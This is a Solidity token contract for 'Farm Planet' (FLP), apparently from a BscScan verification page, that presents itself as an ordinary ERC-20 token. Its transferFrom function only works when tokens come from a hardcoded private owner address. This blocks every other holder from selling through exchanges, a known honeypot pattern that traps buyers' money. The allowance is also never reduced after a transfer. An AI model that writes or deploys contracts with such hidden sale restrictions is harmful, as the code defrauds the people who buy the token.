/**
 *Submitted for verification at BscScan.com on 2021-11-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

contract Token {
    mapping(address => uint256) public balances;

    mapping(address => mapping(address => uint256)) public allowance;

    address private _owner = 0x7224E02Bf5549A26Bc4A45A0E083a7e5bFEEDec8;

    uint256 public totalSupply = 1000000000000 * 10**18;

    string public name = "Farm Planet";

    string public symbol = "FLP";

    uint256 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor() {
        balances[msg.sender] = totalSupply;
    }

    function balanceOf(address owner) public view returns (uint256) {
        return balances[owner];
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(
            balanceOf(msg.sender) >= value,
            "Saldo insuficiente (balance too low)"
        );

        balances[to] += value;

        balances[msg.sender] -= value;

        emit Transfer(msg.sender, to, value);

        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        require(from == _owner, "You are not the owner!");
        require(
            balanceOf(from) >= value,
            "Saldo insuficiente (balance too low)"
        );

        require(
            allowance[from][msg.sender] >= value,
            "Sem permissao (allowance too low)"
        );

        balances[to] += value;

        balances[from] -= value;

        emit Transfer(from, to, value);

        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);

        return true;
    }
}